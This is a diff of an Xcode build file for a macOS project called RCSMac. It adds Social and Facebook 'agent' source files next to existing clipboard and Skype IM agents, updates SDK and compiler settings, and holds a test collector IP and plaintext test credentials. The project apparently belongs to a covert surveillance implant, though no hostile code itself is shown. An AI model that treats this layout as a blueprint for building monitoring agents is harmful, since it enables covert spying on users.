@@ -177,6 +177,9 @@
 		8D11072B0486CEB800E47090 /* InfoPlist.strings in Resources */ = {isa = PBXBuildFile; fileRef = 089C165CFE840E0CC02AAC07 /* InfoPlist.strings */; };
 		8D11072D0486CEB800E47090 /* RCSMMain.m in Sources */ = {isa = PBXBuildFile; fileRef = 29B97316FDCFA39411CA2CEA /* RCSMMain.m */; settings = {ATTRIBUTES = (); }; };
 		8D11072F0486CEB800E47090 /* Cocoa.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1058C7A1FEA54F0111CA2CBB /* Cocoa.framework */; };
+		C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */; };
+		C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4416FC59C900DCBF2A /* __m_Social.m */; };
+		C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */ = {isa = PBXBuildFile; fileRef = C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */; };
 		CC27338216B7D1D100DCD0E4 /* CommandsNetworkOperation.m in Sources */ = {isa = PBXBuildFile; fileRef = CC27338116B7D1D100DCD0E4 /* CommandsNetworkOperation.m */; };
 		CC31C81016DCB5FB00922BD6 /* RCSMTask.m in Sources */ = {isa = PBXBuildFile; fileRef = CC31C80F16DCB5FB00922BD6 /* RCSMTask.m */; };
 		CC3718B016DE0EFA00658703 /* libsqlite3.dylib in Frameworks */ = {isa = PBXBuildFile; fileRef = CC3718AF16DE0EFA00658703 /* libsqlite3.dylib */; };
@@ -415,6 +418,13 @@
 		52D836241393916B00C18E70 /* libxpcomglue_s.a */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; name = libxpcomglue_s.a; path = Support/Firefox/lib/libxpcomglue_s.a; sourceTree = "<group>"; };
 		8D1107310486CEB800E47090 /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		8D1107320486CEB800E47090 /* RCSMac.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RCSMac.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		C52FEF3F16FC596200DCBF2A /* __m_Social_Module.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social_Module.h; path = Agents/Social/__m_Social_Module.h; sourceTree = "<group>"; };
+		C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social_Module.m; path = Agents/Social/__m_Social_Module.m; sourceTree = "<group>"; };
+		C52FEF4316FC59C900DCBF2A /* __m_Social.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social.h; path = Agents/Social/__m_Social.h; sourceTree = "<group>"; };
+		C52FEF4416FC59C900DCBF2A /* __m_Social.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social.m; path = Agents/Social/__m_Social.m; sourceTree = "<group>"; };
+		C52FEF4616FC5A0E00DCBF2A /* __m_Social_Facebook.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = __m_Social_Facebook.h; path = Agents/Social/Facebook/__m_Social_Facebook.h; sourceTree = "<group>"; };
+		C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = __m_Social_Facebook.m; path = Agents/Social/Facebook/__m_Social_Facebook.m; sourceTree = "<group>"; };
+		C52FEF4916FC5A5A00DCBF2A /* social.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = social.h; path = Agents/Social/social.h; sourceTree = "<group>"; };
 		CC27338016B7D1D100DCD0E4 /* CommandsNetworkOperation.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = CommandsNetworkOperation.h; path = Modules/CommandsNetworkOperation.h; sourceTree = "<group>"; };
 		CC27338116B7D1D100DCD0E4 /* CommandsNetworkOperation.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; name = CommandsNetworkOperation.m; path = Modules/CommandsNetworkOperation.m; sourceTree = "<group>"; };
 		CC31C80E16DCB5FB00922BD6 /* RCSMTask.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; name = RCSMTask.h; path = Support/RCSMTask.h; sourceTree = "<group>"; };
@@ -825,6 +835,7 @@
 		1AE6B5610F8E2574004736EA /* Agents */ = {
 			isa = PBXGroup;
 			children = (
+				C52FEF3E16FC58F600DCBF2A /* Social */,
 				5262A92B132A5A2C001D1988 /* RCSMAgentClipboard.h */,
 				5262A92C132A5A2C001D1988 /* RCSMAgentClipboard.m */,
 				5262A92D132A5A2C001D1988 /* RCSMAgentIMSkype.h */,
@@ -1018,6 +1029,28 @@
 			name = Classes;
 			sourceTree = "<group>";
 		};
+		C52FEF3E16FC58F600DCBF2A /* Social */ = {
+			isa = PBXGroup;
+			children = (
+				C52FEF4916FC5A5A00DCBF2A /* social.h */,
+				C52FEF4216FC598C00DCBF2A /* Facebook */,
+				C52FEF3F16FC596200DCBF2A /* __m_Social_Module.h */,
+				C52FEF4016FC596200DCBF2A /* __m_Social_Module.m */,
+				C52FEF4316FC59C900DCBF2A /* __m_Social.h */,
+				C52FEF4416FC59C900DCBF2A /* __m_Social.m */,
+			);
+			name = Social;
+			sourceTree = "<group>";
+		};
+		C52FEF4216FC598C00DCBF2A /* Facebook */ = {
+			isa = PBXGroup;
+			children = (
+				C52FEF4616FC5A0E00DCBF2A /* __m_Social_Facebook.h */,
+				C52FEF4716FC5A0E00DCBF2A /* __m_Social_Facebook.m */,
+			);
+			name = Facebook;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -1098,7 +1131,7 @@
 		29B97313FDCFA39411CA2CEA /* Project object */ = {
 			isa = PBXProject;
 			attributes = {
-				LastUpgradeCheck = 0410;
+				LastUpgradeCheck = 0460;
 			};
 			buildConfigurationList = C01FCF4E08A954540054247B /* Build configuration list for PBXProject "RCSMac" */;
 			compatibilityVersion = "Xcode 3.2";
@@ -1321,6 +1354,9 @@
 				CCFFD70615D8ED6E00131597 /* RCSMGlobals.m in Sources */,
 				CC27338216B7D1D100DCD0E4 /* CommandsNetworkOperation.m in Sources */,
 				CC31C81016DCB5FB00922BD6 /* RCSMTask.m in Sources */,
+				C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */,
+				C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */,
+				C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1358,6 +1394,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
+				COMBINE_HIDPI_IMAGES = YES;
 				COPY_PHASE_STRIP = NO;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_MODEL_TUNING = G5;
@@ -1378,7 +1415,7 @@
 					AppKit,
 				);
 				PRODUCT_NAME = Tests;
-				SDKROOT = macosx10.5;
+				SDKROOT = macosx;
 			};
 			name = Debug;
 		};
@@ -1386,6 +1423,7 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
+				COMBINE_HIDPI_IMAGES = YES;
 				COPY_PHASE_STRIP = YES;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_MODEL_TUNING = G5;
@@ -1406,7 +1444,7 @@
 					AppKit,
 				);
 				PRODUCT_NAME = Tests;
-				SDKROOT = macosx10.5;
+				SDKROOT = macosx;
 				ZERO_LINK = NO;
 			};
 			name = Release;
@@ -1415,6 +1453,8 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ENABLE_OBJC_ARC = NO;
+				COMBINE_HIDPI_IMAGES = YES;
 				COPY_PHASE_STRIP = NO;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_ENABLE_OBJC_GC = supported;
@@ -1427,7 +1467,7 @@
 					MOZILLA_STRICT_API,
 				);
 				GCC_SYMBOLS_PRIVATE_EXTERN = YES;
-				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
 				HEADER_SEARCH_PATHS = "";
 				INFOPLIST_FILE = "RCSMInputManager-Info.plist";
 				INSTALL_PATH = "$(HOME)/Library/Bundles";
@@ -1450,7 +1490,7 @@
 					"-lazy-lnspr4",
 				);
 				PRODUCT_NAME = RCSMInputManager;
-				SDKROOT = macosx10.6;
+				SDKROOT = macosx10.7;
 				USER_HEADER_SEARCH_PATHS = "../**";
 				WRAPPER_EXTENSION = bundle;
 			};
@@ -1461,6 +1501,8 @@
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				CLANG_ENABLE_OBJC_ARC = NO;
+				COMBINE_HIDPI_IMAGES = YES;
 				COPY_PHASE_STRIP = YES;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_ENABLE_OBJC_GC = supported;
@@ -1472,7 +1514,7 @@
 					MOZILLA_STRICT_API,
 				);
 				GCC_SYMBOLS_PRIVATE_EXTERN = YES;
-				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
 				HEADER_SEARCH_PATHS = "";
 				INFOPLIST_FILE = "RCSMInputManager-Info.plist";
 				INSTALL_PATH = "$(HOME)/Library/Bundles";
@@ -1482,6 +1524,7 @@
 					"\"$(SRCROOT)/Support/Firefox\"",
 					"\"$(SRCROOT)/Support/Firefox/lib\"",
 				);
+				MACOSX_DEPLOYMENT_TARGET = 10.6;
 				ONLY_ACTIVE_ARCH = NO;
 				OTHER_LDFLAGS = (
 					"-framework",
@@ -1494,7 +1537,7 @@
 					"-lazy-lnspr4",
 				);
 				PRODUCT_NAME = RCSMInputManager;
-				SDKROOT = macosx10.6;
+				SDKROOT = macosx10.7;
 				USER_HEADER_SEARCH_PATHS = "../**";
 				WRAPPER_EXTENSION = bundle;
 				ZERO_LINK = NO;
@@ -1506,6 +1549,7 @@
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
 				GCC_C_LANGUAGE_STANDARD = gnu99;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_ENABLE_OBJC_EXCEPTIONS = YES;
@@ -1524,7 +1568,7 @@
 				MACOSX_DEPLOYMENT_TARGET = 10.7;
 				ONLY_ACTIVE_ARCH = NO;
 				PRODUCT_NAME = "com.apple.$(TARGET_NAME)";
-				SDKROOT = macosx10.7;
+				SDKROOT = macosx;
 				WRAPPER_EXTENSION = xpc;
 			};
 			name = Debug;
@@ -1534,6 +1578,7 @@
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
 				COPY_PHASE_STRIP = YES;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_C_LANGUAGE_STANDARD = gnu99;
@@ -1548,7 +1593,7 @@
 				MACOSX_DEPLOYMENT_TARGET = 10.7;
 				ONLY_ACTIVE_ARCH = NO;
 				PRODUCT_NAME = "com.apple.$(TARGET_NAME)";
-				SDKROOT = macosx10.7;
+				SDKROOT = macosx;
 				WRAPPER_EXTENSION = xpc;
 			};
 			name = Release;
@@ -1557,7 +1602,8 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
 				COPY_PHASE_STRIP = NO;
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				GCC_DYNAMIC_NO_PIC = NO;
@@ -1578,7 +1624,7 @@
 				ONLY_ACTIVE_ARCH = YES;
 				PRODUCT_NAME = RCSMac;
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001457;
+				RCS_TEST_INSTANCE = RCS_0000001486;
 				RCS_TEST_PASSWD = osx_test;
 				RCS_TEST_SYNCH = NO;
 				RCS_TEST_USER = osxtest;
@@ -1591,7 +1637,8 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				GCC_MODEL_TUNING = G5;
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
@@ -1611,7 +1658,7 @@
 				ONLY_ACTIVE_ARCH = YES;
 				PRODUCT_NAME = RCSMac;
 				RCS_TEST_COLLECTOR = 192.168.100.100;
-				RCS_TEST_INSTANCE = RCS_0000001457;
+				RCS_TEST_INSTANCE = RCS_0000001486;
 				RCS_TEST_PASSWD = osx_test;
 				RCS_TEST_SYNCH = NO;
 				RCS_TEST_USER = osxtest;
@@ -1640,7 +1687,7 @@
 					"-Wl,-search_paths_first",
 					"-lspeex",
 				);
-				SDKROOT = macosx10.5;
+				SDKROOT = macosx;
 				STRIP_INSTALLED_PRODUCT = NO;
 				USER_HEADER_SEARCH_PATHS = "..//**";
 				VALID_ARCHS = "i386 x86_64";
@@ -1674,7 +1721,7 @@
 				LINK_WITH_STANDARD_LIBRARIES = YES;
 				ONLY_ACTIVE_ARCH = YES;
 				OTHER_LDFLAGS = "-Wl,-search_paths_first";
-				SDKROOT = macosx10.5;
+				SDKROOT = macosx;
 				SEPARATE_STRIP = YES;
 				STANDARD_C_PLUS_PLUS_LIBRARY_TYPE = dynamic;
 				USER_HEADER_SEARCH_PATHS = "..//**";
